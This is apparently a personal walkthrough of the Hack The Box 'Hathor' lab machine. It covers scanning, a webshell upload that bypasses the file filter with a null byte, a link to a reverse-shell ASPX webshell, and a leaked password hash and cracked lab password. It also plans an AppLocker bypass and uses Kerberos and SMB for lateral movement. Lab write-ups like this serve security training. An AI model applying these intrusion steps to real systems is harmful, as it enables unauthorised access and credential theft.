# Rustscan & Nmap
```bash
rustscan -a $IP 

sudo nmap -sC -sV -oA nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,53876,65133,65142 $IP

xsltproc -o beauty-scan.html /opt/nmap-bootstrap-xsl/nmap-bootstrap.xsl nmap.xml

DNS:hathor.windcorp.htb
Domain: windcorp.htb0
```

* https://github.com/honze-net/nmap-bootstrap-xsl#build-an-html-file-for-sharing

# Shell as windcorp/web
### Webshell
80 -> Web title -> Google default creds -> File Transfer

Upload webshell -> bypassing by adding `%00.jpg` -> "Copy" the file inorder to rename to get the `.aspx` extenstion.

### Enum
* https://0xdf.gitlab.io/2022/11/19/htb-hathor.html#shell


### INSOMNIA Shell
Since I know that both PowerShell and unsigned binaries like `nc.exe` are going to fail connecting out, I’ll try a more full-featured webshell, like Insomnia. It has a built in reverse shell capability:

* https://github.com/A1vinSmith/pentest/blob/master/shell/insomnia_shell.aspx

# Shell as Bill
### Enum
```cmd powershell
c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-18032022-044046.csv
type exported_windcorp-18032022-044046.csv
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)

c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-04102021-113140.csv
type exported_windcorp-04102021-113140.csv
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'

c:\Get-bADpasswords\Accessible\CSVs>whoami
whoami
windcorp\web

c:\Get-bADpasswords\Accessible\CSVs>powershell $ExecutionContext.SessionState.LanguageMode
powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage			<- CLM

c:\Get-bADpasswords\Accessible\CSVs>powershell get-applockerPolicy -effective -xml
powershell get-applockerPolicy -effective -xml
<AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule></RuleCollection><RuleCollection Type="Dll" EnforcementMode="Enabled"><FilePublisherRule Id="5b74e91f-e7d9-4348-a21b-047d2901c659" Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule><FilePathRule Id="059bf360-e712-427a-8255-59d182bc4cd5" Name="%OSDRIVE%\share\scripts\7-zip64.dll" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%OSDRIVE%\share\scripts\7-zip64.dll" /></Conditions><Exceptions><FilePathCondition Path="%OSDRIVE%\share\scripts\7-zip64.dll:*" /></Exceptions></FilePathRule><FilePathRule Id="3737732c-99b7-41d4-9037-9cddfb0de0d0" Name="(Default Rule) All DLLs located in the Program Files folder" Description="Allows members of the Everyone group to load DLLs that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions></FilePathRule><FilePathRule Id="3a07aecc-17f3-43e5-911b-ddb7e4d7353f" Name="%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll" Description="" UserOrGroupSid="S-1-5-21-3783586571-2109290616-3725730865-10102" Action="Allow"><Conditions><FilePathCondition Path="%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll" />
```

With AppLocker enabled the files that a user can execute get restricted by the AppLocker policy. Looking at
the policy, we can see that AppLocker trusts Microsoft as a publisher. So `Sysinternals` tools can be used
to find writable paths to bypass AppLocker rules. We can use the tool `Accesschk`.

First of all, we download it on our local machine and unzip the archive. Now, we need to find a way to
transfer the executable to the remote machine. Using common Powershell commands like `Copy-Item`,
`wget` or `iwr` yielded no results, most likely due to firewall rules . So, an easy bypass to this problem is to
utilize the File Manager option from the website once again after we change the extension of the file to
`.txt`

```bash
crackmapexec smb $IP -u beatricemill -p '!!!!ilovegood17'
SMB         10.129.47.158   445    10.129.47.158    [*]  x64 (name:10.129.47.158) (domain:10.129.47.158) (signing:True) (SMBv1:False)
SMB         10.129.47.158   445    10.129.47.158    [-] 10.129.47.158\beatricemill:!!!!ilovegood17 STATUS_NOT_SUPPORTE
```

### Kerberos on Linux (Linux Lateral Movement)
Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would.

To use the `kinit` command, which is used to acquire a Kerberos ticket-granting ticket (TGT) for the current user. To request a TGT, we just need to call kinit without parameters and enter the user's AD password.

When users attempt to use Kerberos and specify a principal or user name without specifying what administrative Kerberos realm that principal belongs to, the system appends the default realm. The default realm may also be used as the realm of a Kerberos service running on the local machine. Often, the default realm is the uppercase version of the local DNS domain.

But since I left it empty, I need to config the `/etc/krb5.conf` with the victim domain now. Let's use the infos from rust and nmap.

* https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/configuring_a_kerberos_5_server
* https://docs.bmc.com/docs/decisionsupportserverautomation/85/locating-active-directory-kdcs-350325160.html
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#active-directory-servers

```bash
nslookup -type=srv _kerberos._tcp.windcorp.htb
Server:         10.129.47.158
Address:        10.129.47.158#53

_kerberos._tcp.windcorp.htb     service = 0 100 88 hathor.windcorp.htb.

sudo kinit beatricemill
Password for beatricemill@WINDCORP.HTB: 

sudo klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: beatricemill@WINDCORP.HTB

Valid starting     Expires            Service principal
03/11/23 14:21:32  04/11/23 00:21:32  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 04/11/23 14:21:11

sudo smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k
WARNING: The option -k|--kerberos is deprecated!
session setup failed: NT_STATUS_CONNECTION_RESET

sudo smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```